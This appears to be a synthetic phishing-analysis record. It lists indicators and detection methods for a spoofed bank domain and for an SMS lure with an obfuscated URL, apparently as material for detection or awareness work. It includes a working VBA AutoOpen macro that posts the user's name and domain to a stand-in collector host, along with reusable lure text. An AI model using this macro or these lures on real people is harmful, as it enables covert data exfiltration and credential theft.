technical_data.url_structure: https://rnbsbank-secure.com/verify?token=5f8d2b3c4e9a7d1f (domain mimics legitimate bank domain with addition of '-secure' suffix, token is random 16 hex chars)

indicators: Domain rnbsbank-secure.com registered recently (within last 2 months)
Email from finance-update@rnbsbank-secure.com spoofing legitimate bank
URL uses rnbsbank-secure.com instead of rnbsbank.com
Token parameter in URL suspicious, likely phishing landing page
SMTP server IP 198.51.100.24 does not match legitimate bank mail servers
examples.detection_method: Email gateway with SPF, DKIM, DMARC verification flagged domain similarity and domain age; URL reputation systems flagged rnbsbank-secure.com; user education detects unexpected wire transfer request; network IDS detects outbound DNS queries for rnbsbank-secure.com; sandbox detonation shows phishing landing page

attachment_details.macro_code_snippet:
Sub AutoOpen()
   Dim strURL As String
   strURL = "http://198.51.100.45/malware/collector.php"
   Dim strData As String
   strData = Environ("USERNAME") & ":" & Environ("USERDOMAIN")
   Dim objHttp As Object
   Set objHttp = CreateObject("MSXML2.XMLHTTP")
   objHttp.Open "POST", strURL, False
   objHttp.Send strData
End Sub
attachment_details.macro_behavior: Upon opening, macro sends HTTP POST request with username and domain info to external IP 198.51.100.45

examples.scenario: Spear phishing via SMS directing employee to credential harvesting site with URL obfuscation

technical_data.sms_message:
From: +1-415-555-0199
To: +1-415-555-0123
Date: 2023-05-25T08:12:45-07:00
Message: "Your HR portal account has been suspended. Verify immediately: hxxps://hr-ver1fy.secure-portal.us/login?session=ab12cd34ef56"

url_obfuscation_methods: Subdomain 'hr-ver1fy' uses '1' instead of 'i' to mimic 'hr-verify'
Use of hyphen to separate 'secure-portal' to appear legitimate
Top-level domain '.us' instead of .com to evade common blacklist
Use of session token query parameter to appear dynamic and legitimate
